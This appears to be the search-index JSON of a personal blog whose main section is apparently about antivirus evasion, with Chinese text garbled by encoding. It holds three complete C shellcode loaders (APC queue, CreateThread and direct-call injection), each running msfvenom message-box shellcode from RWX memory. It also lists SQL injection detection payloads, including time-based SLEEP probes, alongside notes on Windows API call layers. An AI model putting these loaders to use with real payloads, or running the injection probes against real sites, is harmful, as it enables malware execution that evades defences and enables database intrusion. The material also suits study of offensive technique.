[{"id":0,"href":"/posts/2026/01/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/","title":"PEæ–‡ä»¶ç»“æ„","section":"å…æ€","content":" "},{"id":1,"href":"/posts/2026/01/Windows-API-%E8%B0%83%E7%94%A8%E5%B1%82%E7%BA%A7/","title":"Windows API è°ƒç”¨å±‚çº§","section":"å…æ€","content":" ç¬¬ä¸€å±‚ï¼šStandard Library (æ ‡å‡†åº“å±‚)# ä¾‹å¦‚ï¼šCè¯­è¨€ä¸­çš„\n1 FILE* fp = fopen(\u0026#34;test.txt\u0026#34;, \u0026#34;w\u0026#34;); // åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ æˆ–è€…javaä¸­çš„ï¼š\n1 new FileOutputStream(\u0026#34;test.txt\u0026#34;); ç¬¬äºŒå±‚ï¼šWin32 API / Windows Subsystem (å­ç³»ç»Ÿå±‚)# è¿™æ˜¯å¾®è½¯å®˜æ–¹æä¾›ç»™å¼€å‘è€…çš„ä¸€å¥—æ ‡å‡†æ¥å£ï¼Œé€šå¸¸ä½äº Kernel32.dll ã€ User32.dll ç­‰ DLL ä¸­ã€‚ å½“ fopen åœ¨ Windows ä¸Šè¿è¡Œæ—¶ï¼Œå®ƒæœ€ç»ˆä¼šè°ƒç”¨ï¼š\nCreateFileA(\u0026#34;test.txt\u0026#34;, ...); // ä½äº Kernel32.dllç¬¬ä¸‰å±‚ï¼šNative API (åŸç”Ÿ API å±‚)# Kernel32.dll ä¸­çš„ CreateFile ç»è¿‡ä¸€ç³»åˆ—æ£€æŸ¥åï¼Œä¼šè°ƒç”¨æ›´åº•å±‚çš„å‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°ä½äº Ntdll.dll ä¸­ï¼š\nNtCreateFile(...); // æˆ–è€… ZwCreateFileNtCreateFile çš„æ ¸å¿ƒä»»åŠ¡åªæœ‰ä¸¤ä»¶äº‹ï¼š\næŠŠ ç³»ç»Ÿè°ƒç”¨å· (SSN) æ”¾è¿› EAX å¯„å­˜å™¨ï¼ˆä¾‹å¦‚ Win10 ä¸Šå¯èƒ½æ˜¯ 0x55 ï¼‰ã€‚ æ‰§è¡Œ syscall æŒ‡ä»¤ï¼ˆx64ï¼‰æˆ– sysenter æŒ‡ä»¤ï¼ˆx86ï¼‰ã€‚ ====== è·¨è¶Šè¾¹ç•Œï¼šç”¨æˆ·æ€ (User Mode) -\u0026gt; å†…æ ¸æ€ (Kernel Mode) ======# æ‰§è¡Œ syscall æŒ‡ä»¤åï¼ŒCPU æƒé™ä» Ring 3 åˆ‡æ¢åˆ° Ring 0ã€‚\nç¬¬å››å±‚ï¼šSystem Service Dispatcher (ç³»ç»ŸæœåŠ¡åˆ†å‘å±‚)# CPU åˆ‡æ¢åˆ°å†…æ ¸æ€åï¼Œä¼šè·³è½¬åˆ°å†…æ ¸æ–‡ä»¶ ntoskrnl.exe ä¸­çš„ä¸€ä¸ªç‰¹å®šå¤„ç†å‡½æ•°ï¼ˆé€šå¸¸æ˜¯ KiSystemCall64 ï¼‰ã€‚å®ƒè¯»å– EAX ä¸­çš„å·ç ï¼ˆSSNï¼‰ï¼Œå»æŸ¥ä¸€å¼ è¡¨â€”â€” SSDT (System Service Descriptor Table) ï¼Œæ ¹æ®å·ç æ‰¾åˆ°å¯¹åº”çš„å†…æ ¸å¤„ç†å‡½æ•°åœ°å€ã€‚\nç¬¬äº”å±‚ï¼šKernel Executive (å†…æ ¸æ‰§è¡Œä½“å±‚)# SSDT æŒ‡å‘äº†çœŸæ­£çš„å†…æ ¸å‡½æ•°ï¼š\nNtCreateFile(...); // ä½äº ntoskrnl.exeï¼Œåå­—å’Œ Ntdll é‡Œçš„ä¸€æ ·ï¼Œä½†ä»£ç å®Œå…¨ä¸åŒVisual Studio è°ƒè¯•fopenåº•å±‚API# é…ç½® Visual Studio è°ƒè¯•ç¯å¢ƒ# å»æ‰å‹¾é€‰å¯ç”¨\u0026quot;ä»…æˆ‘çš„ä»£ç \u0026quot; å¯ç”¨ç¬¦å·æœåŠ¡å™¨\nè°ƒè¯• (Debugging) -\u0026gt; ç¬¦å· (Symbols) -\u0026gt; å‹¾é€‰ Microsoft ç¬¦å·æœåŠ¡å™¨ (Microsoft Symbol Servers) ã€‚\n1 2 3 4 5 6 7 8 #define _CRT_SECURE_NO_WARNINGS #include \u0026lt;stdio.h\u0026gt; int main() { FILE* fp = fopen(\u0026#34;test.txt\u0026#34;, \u0026#34;w\u0026#34;); // åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ if (fp) fclose(fp); return 0; } å¯ä»¥é…ç½®æ–­ç‚¹å¿«é€Ÿç¡®è®¤ï¼š\nRing 0å±‚VSå°±æ— æ³•çœ‹åˆ°äº†\nåœ¨çº¿æŸ¥è¯¢ç½‘ç«™# ReactOS Documentation â€‹\thttps://doxygen.reactos.org\nUndocumented NT Internals https://undocumented.ntinternals.net "},{"id":2,"href":"/posts/2026/01/APCLocalInjection/","title":"APCLocalInjection","section":"å…æ€","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 #include \u0026lt;windows.h\u0026gt; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char buf[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; // ç”³è¯·å†…å­˜ (RWX) void* exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); // å¤åˆ¶shellcdoe RtlMoveMemory(exec, buf, sizeof(buf)); // æ’å…¥ APC é˜Ÿåˆ— // å‚æ•°1: APC å‡½æ•°åœ°å€ (Shellcode) // å‚æ•°2: ç›®æ ‡çº¿ç¨‹å¥æŸ„ (å½“å‰çº¿ç¨‹) // å‚æ•°3: ä¼ ç»™å‡½æ•°çš„å‚æ•° QueueUserAPC((PAPCFUNC)exec, GetCurrentThread(), NULL); // è§¦å‘æ‰§è¡Œ (Alertable State) // çº¿ç¨‹å¿…é¡»è¿›å…¥\u0026#34;å¯è­¦å‘ŠçŠ¶æ€\u0026#34;ï¼ŒAPC æ‰ä¼šæ‰§è¡Œã€‚ // SleepEx çš„ç¬¬äºŒä¸ªå‚æ•° TRUE è¡¨ç¤ºå…è®¸è¢« APC æ‰“æ–­ã€‚ SleepEx(1000, TRUE); return 0; } "},{"id":3,"href":"/posts/2026/01/CreateThreadInjection/","title":"CreateThreadInjection","section":"å…æ€","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 #include \u0026lt;windows.h\u0026gt; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char buf[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; // 1. ç”³è¯·å†…å­˜ (RWX) void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE); // 2. å¤åˆ¶æ•°æ® RtlMoveMemory(exec, buf, sizeof(buf)); // 3. åˆ›å»ºçº¿ç¨‹æ‰§è¡Œ HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0); // 4. ç­‰å¾…æ‰§è¡Œç»“æŸ WaitForSingleObject(th, -1); return 0; } "},{"id":4,"href":"/posts/2026/01/MySQL-injection/","title":"MySQL injection","section":"MySQL æ³¨å…¥","content":" æ£€æµ‹payload\n\u0026#39; \u0026#34; ` %df\u0026#39; %27 %2527 ) )) \u0026#39;) \u0026#34;) ; -- /* # 1+1 1-0 1/0 1e308 @@version /**/ %0a %09 -- AND 1=1 AND 1=2 \u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; AND \u0026#39;1\u0026#39;=\u0026#39;2 \u0026#34; AND \u0026#34;1\u0026#34;=\u0026#34;1 \u0026#34; AND \u0026#34;1\u0026#34;=\u0026#34;2 \u0026#39;) AND (\u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39; AND SLEEP(5)--+ \u0026#34; AND SLEEP(5)--+ AND (SELECT * FROM (SELECT(SLEEP(5)))a)"},{"id":5,"href":"/posts/2026/01/LocalProcessInjection/","title":"LocalProcessInjection","section":"å…æ€","content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026#34;Windows.h\u0026#34; int main() { //./msfvenom -p windows/x64/messagebox TEXT=\u0026#34;Hello\u0026#34; TITLE=\u0026#34;Test\u0026#34; -f c unsigned char shellcode[] = \u0026#34;\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\u0026#34; \u0026#34;\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\u0026#34; \u0026#34;\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\u0026#34; \u0026#34;\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\u0026#34; \u0026#34;\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\u0026#34; \u0026#34;\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\u0026#34; \u0026#34;\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\u0026#34; \u0026#34;\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\u0026#34; \u0026#34;\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\u0026#34; \u0026#34;\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\u0026#34; \u0026#34;\\xc1\\x38\\xe0\\x75\\xf1\\x3e\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\u0026#34; \u0026#34;\\x75\\xd6\\x58\\x3e\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x3e\\x41\u0026#34; \u0026#34;\\x8b\\x0c\\x48\\x3e\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x3e\\x41\\x8b\u0026#34; \u0026#34;\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\u0026#34; \u0026#34;\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\u0026#34; \u0026#34;\\x59\\x5a\\x3e\\x48\\x8b\\x12\\xe9\\x49\\xff\\xff\\xff\\x5d\\x3e\\x48\u0026#34; \u0026#34;\\x8d\\x8d\\x19\\x01\\x00\\x00\\x41\\xba\\x4c\\x77\\x26\\x07\\xff\\xd5\u0026#34; \u0026#34;\\x49\\xc7\\xc1\\x00\\x00\\x00\\x00\\x3e\\x48\\x8d\\x95\\x0e\\x01\\x00\u0026#34; \u0026#34;\\x00\\x3e\\x4c\\x8d\\x85\\x14\\x01\\x00\\x00\\x48\\x31\\xc9\\x41\\xba\u0026#34; \u0026#34;\\x45\\x83\\x56\\x07\\xff\\xd5\\x48\\x31\\xc9\\x41\\xba\\xf0\\xb5\\xa2\u0026#34; \u0026#34;\\x56\\xff\\xd5\\x48\\x65\\x6c\\x6c\\x6f\\x00\\x54\\x65\\x73\\x74\\x00\u0026#34; \u0026#34;\\x75\\x73\\x65\\x72\\x33\\x32\\x2e\\x64\\x6c\\x6c\\x00\u0026#34;; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; } "},{"id":6,"href":"/posts/2026/01/My-First-Post/","title":"My First Post","section":"Posts","content":"Introduction# This is bold text, and this is emphasized text.\nVisit the Hugo website!\n"},{"id":7,"href":"/about/","title":"å…³äºæˆ‘","section":"Fivesix's blog","content":"ğŸ‘‹ ä½ å¥½ï¼# ğŸˆšï¸\n"}]